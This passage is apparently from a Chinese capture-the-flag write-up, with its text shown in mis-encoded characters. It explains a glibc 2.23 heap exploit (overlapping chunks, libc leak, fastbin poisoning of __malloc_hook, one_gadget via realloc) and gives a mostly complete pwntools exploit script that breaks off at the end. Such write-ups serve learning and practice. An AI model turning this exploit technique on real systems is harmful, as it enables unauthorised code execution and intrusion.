<p>ç„¶ååªè¦æŠŠç¬¬ä¸‰ä¸ªå †å—çš„å†…å®¹æ•°æ®å°±å¯ä»¥leakå‡ºlibcçš„åœ°å€äº†</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šè¿™ä¸ªåœ°æ–¹è¿˜è¦è®°å¾—å†ç¬¬ä¸‰ä¸ªå †å—åé¢å†ç”³è¯·ä¸€ä¸ªå°å †å—ï¼Œé˜²æ­¢freeä¼ªé€ äºŒä¸‰åˆä½“å †çš„æ—¶å€™ï¼Œè·Ÿtop chunkåˆå¹¶äº†ã€‚</p>
<p><strong>æ³¨æ„2</strong>ï¼šè¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦main arena + 88çš„offsetï¼Œè¿™ä¸ªå…¶å®å¾ˆç®€å•ï¼Œgdbä¸€ä¸‹ç¨‹åºï¼Œç„¶åæ‰¾åˆ°libcçš„åŸºå€ï¼ˆPwngdbï¼ˆä¸æ˜¯pwndbgå™¢~~~åˆå­¦å¾ˆå®¹æ˜“çœ‹æ··çš„ï¼‰åœ¨gdbçš„åŸºç¡€ä¸Šç»™äº†libcæŒ‡ä»¤ï¼Œå¯ä»¥ç›´æ¥çœ‹ï¼‰ï¼Œç„¶åå¤åˆ¶å‡ºæ¥ï¼Œå†æ‰¾åˆ°æ­¤æ—¶main arena + 88çš„çœŸå®åœ°å€ï¼Œç„¶åä¸¤ä¸ªç›¸å‡å°±æ˜¯offsetäº†ã€‚</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 0 ç”¨äºè¦†ç›–1çš„å¤´éƒ¨ï¼Œä¼ªé€ äºŒä¸‰åˆä½“å †ï¼ˆäºŒä¸‰æŒ‡çš„ä¸‹æ ‡ä¸º1å’Œ2çš„å †ï¼‰</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 2 </span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>) <span class="comment"># 3 å«ä¸€ä¸‹ï¼Œé˜²æ­¢å’Œtop chunk åˆå¹¶</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x19</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>) <span class="comment"># å°†ç¬¬ä¸€ä¸ªå †å—å†™ä¸Šä¼ªé€ æ•°æ®ï¼Œå…ˆå†™äº†0x18ä¸ªéšä¾¿çš„ä¸œè¥¿ï¼Œç„¶åå°±æ˜¯ç¬¬äºŒä¸ªå †å—ï¼ˆä¸‹æ ‡ä¸º1ï¼‰çš„sizeå­—æ®µï¼Œsizeå¤§å°å†™ä¸º0x70*2ä¹Ÿå°±æ˜¯0xe0ï¼ŒåŒæ—¶å‰ä¸€ä¸ªå—åœ¨ä½¿ç”¨ï¼Œå› æ­¤è¦å†™æˆ0xe1ã€‚æ³¨æ„ï¼šè¿™ä¸ªæ•°å€¼æ ¹æ®ç”³è¯·çš„äºŒä¸‰ä¸¤ä¸ªå †å—ï¼ˆä¸‹æ ‡1ã€2ï¼‰çš„å¤§å°æ¥ä¿®æ”¹</span></span><br><span class="line">remove(<span class="number">1</span>) <span class="comment"># äºŒä¸‰åˆä½“å †ï¼ˆä¸‹æ ‡1ã€2ï¼‰è¢«free</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;aaaa&quot;</span>) <span class="comment"># ä¸‹æ ‡1é‡æ–°åˆ†é…å›æ¥ </span></span><br><span class="line">show() <span class="comment"># æ­¤æ—¶ä¸‹æ ‡2çš„å †è¿˜åœ¨unsorted biné‡Œï¼Œä½†æ˜¯æŒ‡é’ˆæ²¡æœ‰free</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;2 : &quot;</span>) <span class="comment"># pointer 2 is still point to #2 and #2 is still in unsorted bin</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f1442c64b78</span> - <span class="number">0x7f14428a0000</span>) <span class="comment"># leak</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>æœ‰äº†libcä¹‹åï¼Œæˆ‘ä»¬å°±æ˜¯è¦æ”¹<code>__malloc_hook</code>äº†ã€‚</p>
<p><strong>é”™è¯¯æ€è·¯</strong>ï¼šç”¨unlink æ¥ä½¿å¾—<code>__malloc_hook</code>çš„åœ°å€ä¸‹å†™å…¥one_gadget ã€‚<strong>ä¹Ÿæœ‰ä¸€ç§å¯èƒ½</strong>ï¼Œå°±æ˜¯æˆ‘unlinkç†è§£ä¸åˆ°ä½ï¼Œåˆ°åº•è¦å†™ä»€ä¹ˆåˆ°fdå’Œbkå†™çš„æœ‰é—®é¢˜ï¼Œ<strong>è¿™ä¸ªå¯ä»¥å†å»è€ƒç©¶ä¸€ä¸‹</strong>ã€‚</p>
<p><strong>æ­£ç¡®æ€è·¯</strong>ï¼šæˆ‘ä»¬éœ€è¦å¼„ä¸€ä¸ªfast biné‡Œçš„å †å—ï¼Œç„¶åå¯¹é‡Œé¢çš„å†…å®¹è¿›è¡Œä¿®æ”¹ã€‚é‚£ä¹ˆæ€ä¹ˆèƒ½å¤Ÿå¯¹biné‡Œé¢çš„ï¼Œä¹Ÿå°±æ˜¯freeçš„å †å—è¿›è¡Œå†™æ“ä½œå‘¢ï¼Ÿåœ¨è¿™ä¸ªé¢˜æŠŠæŒ‡é’ˆè¿˜éƒ½æ¸…ç©ºçš„æƒ…å†µä¸‹ã€‚</p>
<p>æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥ç»§ç»­ç”¨ä¸Šé¢leakçš„æ€è·¯ã€‚æˆ‘ä»¬ç°åœ¨åœ¨unsorted binä¸­çš„ä¸€ä¸ªå †å—å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆè¿˜å¯ä»¥ç”¨çš„å †å—ã€‚æ­£å¥½å¤§å°æ˜¯0x70ï¼ˆç®—ä¸Šmetadataï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å…ˆæ‹¿å‡ºæ¥å†freeæ‰ï¼Œç„¶åå®ƒå°±è¿›åˆ°fast binäº†ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™ï¼Œæˆ‘ä»¬ä¹‹å‰çš„ç¬¬ä¸‰ä¸ªå †å—ï¼ˆä¸‹æ ‡ä¸º2ï¼‰çš„æŒ‡é’ˆå°±æŒ‡å‘fast biné‡Œé¢çš„é‚£ä¸ªå†…å®¹ã€‚</p>
<p>ç„¶åæˆ‘ä»¬ä¿®æ”¹ç¬¬ä¸‰ä¸ªå †å—ï¼ˆä¸‹æ ‡ä¸º2ï¼‰çš„fdå­—æ®µçš„ä½ç½®ï¼Œæ”¹æˆ<code>__malloc_hook</code>çš„åœ°å€ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å†åˆ†é…ä¸€ä¸ªçš„æ—¶ä¸€æ ·å¤§å°çš„ï¼ˆæˆ‘è¿™ä¸ªåšæ³•é‡Œï¼Œä»–ä»¬æ˜¯ä¸²åœ¨fast binä¸­0x70å­—æ®µï¼Œæ‰€ä»¥æˆ‘malloc 0x60ï¼‰ã€‚</p>
<p>è¿™æ ·è¿™ä¸ªæ—¶å€™ï¼Œfast biné‡Œé¢è¿˜æœ‰ä¸€ä¸ªå—ï¼Œè¿™ä¸ªå—çš„åœ°å€æ˜¯<code>__malloc_hook</code>ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­malloc 0x60ï¼Œå®ƒåˆ™è¿˜ä¼šå†fast binçš„0x70å­—æ®µå»æ‰¾ï¼Œå°±ä¼šæ‰¾åˆ°è¿™ä¸ª<code>__malloc_hook</code>ä»¥åŠå…¶åé¢çš„0x70ï¼ˆå‰0x10æ˜¯metadataï¼‰ä½œä¸ºå †å—ï¼Œç»™å…¶ä¸‹æ ‡ä¸º5ã€‚</p>
<p><strong>é‡ç‚¹ä¸­çš„é‡ç‚¹</strong>ï¼šè¿™é‡Œè¦æ³¨æ„ï¼Œå…¶å®æˆ‘åœ¨ä¿®æ”¹fast biné‚£ä¸ªå †å—çš„fdä½ç½®çš„æ—¶å€™ï¼Œä¸èƒ½å†™<code>__malloc_hook</code>ï¼Œå› ä¸ºé¦–å…ˆæˆ‘ä»¬çŸ¥é“å‰é¢æœ‰0x10æ˜¯metadataï¼Œæ‰€ä»¥æˆ‘ä»¬è‡³å°‘è¦æŠŠfdå†™ä¸º<code>__malloc_hook - 0x10</code>ï¼ˆå› ä¸ºç›®çš„æ˜¯è®©<code>__malloc_hook</code>çš„åœ°æ–¹æ˜¯one_gadgetï¼‰ã€‚ä½†æ˜¯è¿™ä¹ˆå†™è¿˜æ˜¯ä¸è¡Œï¼Œåˆ†é…ä¸å‡ºæ¥ï¼Œä¼šæŠ¥é”™ï¼Œç„¶åæˆ‘ä¸€ç›´æµ‹è¯•ï¼Œå‘ç°å°±æ˜¯<code>__malloc_hook - 0x23</code>æˆåŠŸäº†ï¼Œå¯ä»¥åˆ†é…å‡ºæ¥ï¼Œå¹¶ä¸”æ²¡æœ‰æŠ¥é”™ã€‚çœ‹äº†å¾ˆå¤šçš„èµ„æ–™ï¼Œå¤§å®¶ä¹Ÿéƒ½æ˜¯0x23ï¼Œ<strong>åŸå› æš‚æ—¶è¿˜ä¸çŸ¥é“</strong>ã€‚</p>
<p><strong>é‡ç‚¹ä¸­çš„é‡ç‚¹çš„é‡ç‚¹</strong>ï¼šé‚£ä¹ˆè¿™æ ·åˆ†é…å‡ºæ¥ä¹‹åï¼Œåœ¨æ²¡ç”¨çš„åœ°æ–¹æ”¾æ‚ç‰©ï¼Œæœ€å<code>__malloc_hook</code>çš„ä½ç½®æ”¾one_gadgetçœŸçš„å°±è¡Œäº†å—ï¼Ÿï¼Ÿï¼Ÿç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œå› ä¸ºone_gadgetä½¿ç”¨æ¡ä»¶çš„åŸå› ï¼Œåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼Œ4ä¸ªone_gadgetéƒ½ä¸è¡Œâ€¦â€¦.ç„¶åæˆ‘æ‰¾äº†å¾ˆå¤šèµ„æ–™ï¼Œæœ‰äººè¯´å¯ä»¥æŠŠæ§åˆ¶æµæ”¹æˆ <code>malloc</code> -&gt; <code>__malloc_hook</code> -&gt; <code>realloc</code> -&gt; <code>__realloc_hook</code> å› ä¸ºreallocå‰é¢æœ‰å¾ˆå¤špushæ“ä½œï¼Œå¯ä»¥æ§åˆ¶æ ˆçš„é«˜åº¦ã€‚</p>
<p><strong>ä¸‹é¢æˆ‘ä»¬æ¥è®²è®²è¿™ä¸ªæ“ä½œè¦æ€ä¹ˆå†™</strong></p>
<p>é¦–å…ˆæˆ‘ä»¬æ‰¾åˆ°reallocçš„offsetï¼Œç„¶ååŠ ä¸ŠåŸºå€å°±å¥½äº†ã€‚é‚£ä¹ˆè¦å®ç°ä¸Šé¢çš„æµç¨‹ï¼Œæˆ‘ä»¬è¦å°†<code>__malloc_hook</code>é‡Œé¢å†™æˆreallocçš„åœ°å€ï¼Œç„¶ååœ¨<code>__realloc_hook</code>é‡Œé¢å†å†™ä¸Šone_gadgetã€‚</p>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼š<code>__realloc_hook</code> åœ¨ <code>__malloc_hook - 0x8</code> çš„åœ°æ–¹ã€‚</p>
</blockquote>
<p>ç„¶åè¿™ä¸ªåšæ³•æˆ‘æ²¡æœ‰ä»”ç»†å»è°ƒæ ˆçš„å†…å®¹ï¼Œå°±ç›´æ¥è¿™ä¹ˆå†™ç”¨ç¬¬äºŒä¸ªone_gadgetå°±æ‹¿åˆ°shelläº†ã€‚ä¸è¿‡å®é™…ä¸Šï¼Œå¯ä»¥é€šè¿‡æ”¹å˜<code>__malloc_hook</code>ä¸­å†™çš„åœ°å€ï¼Œæ¥è·³è¿‡reallocä¸­çš„ä¸€äº›pushæ“ä½œï¼Œä»¥æ­¤è¾¾åˆ°æ“ä½œæ ˆé‡Œé¢å†…å®¹çš„æ•ˆæœã€‚å…·ä½“å¯ä»¥çœ‹çœ‹è¿™ä¸ª<a target="_blank" rel="noopener" href="http://pearcechn.top/2021/01/22/%E3%80%90pwn%E7%AC%94%E8%AE%B0%E3%80%91one_gadget%E7%9A%84%E9%99%90%E5%88%B6%E5%8F%8A%E5%88%A9%E7%94%A8/">åšå®¢ï¼Œä¸»è¦è®²çš„one_gadgetçš„é™åˆ¶å’Œåˆ©ç”¨</a></p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_addr)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 4 ï¼Œè¿™ä¸ªæ“ä½œæŠŠ unsorted bin é‡Œé¢çš„å†…å®¹å–å‡ºæ¥ï¼Œå…¶åœ°å€å’Œä¸‹æ ‡2ä¸€æ ·</span></span><br><span class="line">remove(<span class="number">4</span>) <span class="comment"># put ä¸‹æ ‡4 into fast bin</span></span><br><span class="line"><span class="comment">#p = p64(0)</span></span><br><span class="line"><span class="comment">#p += p64(0xd1)</span></span><br><span class="line">p = p64(malloc_hook_addr - <span class="number">0x23</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook_addr - <span class="number">0x23</span>)</span><br><span class="line"><span class="comment">#print hex(libc_base + one[0])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;æœ€å¼€å§‹æƒ³ç”¨unlinkå¥½åƒä¸å¤ªè¡Œï¼Œ2.23å¯èƒ½ä¹Ÿæœ‰æ£€æŸ¥</span></span><br><span class="line"><span class="string">p += p64(libc_base + one[0] - 0x10)</span></span><br><span class="line"><span class="string">print libc_base + one[0] - 0x10</span></span><br><span class="line"><span class="string">p += &#x27;d&#x27;*0xb0</span></span><br><span class="line"><span class="string">p += p64(0xd0)</span></span><br><span class="line"><span class="string">p += p64(0x80)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>, <span class="number">0x08</span>, p) <span class="comment"># ä¿®æ”¹ä¸‹æ ‡2çš„fdå­—æ®µï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹fast binä¸­ä¸‹æ ‡4çš„fd</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># å§ä¸‹æ ‡4ä»fast binæ‹¿å‡ºæ¥</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># get malloc_hook -0x23 as #5</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">5</span>, <span class="number">0xb</span> + <span class="number">0x8</span> + <span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(libc_base + one[<span class="number">1</span>]) + p64(realloc_addr))</span><br><span class="line"><span class="comment"># å°†malloc_hook -0x23çš„åœ°æ–¹å†™æˆä¸Šè¿°æ§åˆ¶æµå¯¹åº”çš„è¦æ±‚ã€‚</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>æœ€å</strong>ï¼šæˆ‘ä»¬æœ€åå†è°ƒç”¨ä¸€ä¸‹mallocå‡½æ•°å°±èƒ½æ‹¿åˆ°shelläº†</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">r.send(<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="å®Œæ•´çš„exp"><a href="#å®Œæ•´çš„exp" class="headerlink" title="å®Œæ•´çš„exp"></a>å®Œæ•´çš„exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#r = remote(&#x27;106.14.112.162&#x27;,&#x27;10013&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#e = ELF(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="comment">#r.recvuntil()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,name</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    r.send(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,length,name</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(index))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(length))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">	r.send(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x10,&quot;aaaa&quot;)</span></span><br><span class="line"><span class="comment">#add(0x68,&quot;bbbb&quot;) # - 0</span></span><br><span class="line"><span class="comment">#add(0x80,&quot;bbbb&quot;)</span></span><br><span class="line"><span class="comment">#add(0x18,&quot;cccc&quot;) # - 1 in case of 0 is merged to top chunk when free 0</span></span><br><span class="line"><span class="comment">#remove(0)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x80,b&#x27;\x61&#x27;)</span></span><br><span class="line"><span class="comment">#add(0x80,&quot;&quot;)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#show()</span></span><br><span class="line"><span class="comment">#r.recvuntil()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = p64(0x0)</span></span><br><span class="line"><span class="comment">#p += p64()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line"><span class="comment">#add(0x10,&#x27;bbbb&#x27;) # 4 </span></span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>, <span class="number">0x19</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">remove(<span class="number">1</span>) <span class="comment"># 1 and 2 removed</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;aaaa&quot;</span>) <span class="comment"># 1 was malloced </span></span><br><span class="line">show()</span><br><span class="line">r.recvuntil(<span class="string">&quot;2 : &quot;</span>) <span class="comment"># pointer 2 is still point to #2 and #2 is still in unsorted bin</span></span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f1442c64b78</span> - <span class="number">0x7f14428a0000</span>) <span class="comment"># hou mian liang ge wo shi cong mou yi ci zhixing guocheng zhong nong chulai de</span></span><br><span class="line"><span class="comment">#print hex(libc_base)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(e.got[&#x27;puts&#x27;])</span></span><br><span class="line"></span><br><span class="line">malloc_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc_addr = libc_base + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(realloc_addr)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># 4 ba unsorted bin li mian qu chu lai equals to #2</span></span><br><span class="line">remove(<span class="number">4</span>) <span class="comment"># put #4 into fast bin</span></span><br><span class="line"><span class="comment">#p = p64(0)</span></span><br><span class="line"><span class="comment">#p += p64(0xd1)</span></span><br><span class="line">p = p64(malloc_hook_addr - <span class="number">0x23</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook_addr - <span class="number">0x23</span>)</span><br><span class="line"><span class="comment">#print hex(libc_base + one[0])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p += p64(libc_base + one[0] - 0x10)</span></span><br><span class="line"><span class="string">print libc_base + one[0] - 0x10</span></span><br><span class="line"><span class="string">p += &#x27;d&#x27;*0xb0</span></span><br><span class="line"><span class="string">p += p64(0xd0)</span></span><br><span class="line"><span class="string">p += p64(0x80)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>, <span class="number">0x08</span>, p) <span class="comment"># equals to change 4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># get #4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;aaaa&#x27;</span>) <span class="comment"># get malloc_hook -0x23 as #5</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print r.recvuntil(&quot;choice:&quot;)</span></span><br><span class="line"><span class="string">r.sendline(&quot;2&quot;)</span></span><br><span class="line"><span class="string">print r.recvuntil(&quot;name:&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.send(str(0x60))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">r.recvuntil(&quot;item:&quot;)</span></span><br><span class="line"><span class="string">r.send(name)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">5</span>, <span class="number">0xb</span> + <span class="number">0x8</span> + <span class="number">0x8</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span> + p64(libc_base + one[<span class="number">1</span>]) + p64(realloc_addr))</span><br><span class="line"><span class="comment">#change(0,0,&quot;&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#remove(3)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r.recvuntil(&quot;choice:&quot;)</span></span><br><span class="line"><span class="comment">#r.sendline(&quot;7&quot;)</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.recvuntil(<span 